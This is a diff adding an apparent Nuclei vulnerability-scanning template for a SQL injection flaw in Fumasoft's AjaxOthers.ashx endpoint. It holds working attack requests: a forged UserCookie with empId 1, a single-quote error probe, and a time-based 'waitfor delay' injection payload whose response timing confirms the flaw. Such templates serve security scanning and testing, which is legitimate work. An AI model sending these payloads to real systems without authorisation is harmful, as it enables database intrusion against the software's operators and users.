@@ -1,0 +1,52 @@
+id: poc-yaml-fumasoft-ajaxothers-sqli
+info:
+  name: 孚盟云 AjaxOthers SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /m/Dingding/Ajax/AjaxOthers.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UserCookie={"empId":"1"}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=GetCheckRepeatData&searchVal='&type=customer
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "未将对象引用设置到对象的实例"
+        part: body
+
+  - raw:
+      - |
+        POST /m/Dingding/Ajax/AjaxOthers.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UserCookie={"empId":"1"}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=GetCheckRepeatData&searchVal='waitfor delay'0:0:{{t1}}'--&type=customer
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<html"
+        part: body
+        negative: true
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
